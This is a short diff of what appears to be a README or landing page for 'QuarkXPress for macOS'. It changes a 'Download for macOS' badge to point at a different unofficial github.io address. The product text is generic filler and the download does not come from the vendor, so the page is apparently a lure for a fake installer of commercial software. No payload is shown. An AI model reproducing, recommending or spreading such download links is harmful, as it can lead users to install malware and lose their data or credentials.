@@ -6,7 +6,7 @@
 <h3>QuarkXPress for macOS</h3>
 <p>QuarkXPress is a macOS-focused application designed to support structured workflows, predictable behavior, and stable day-to-day operation within the desktop environment.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/qw">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
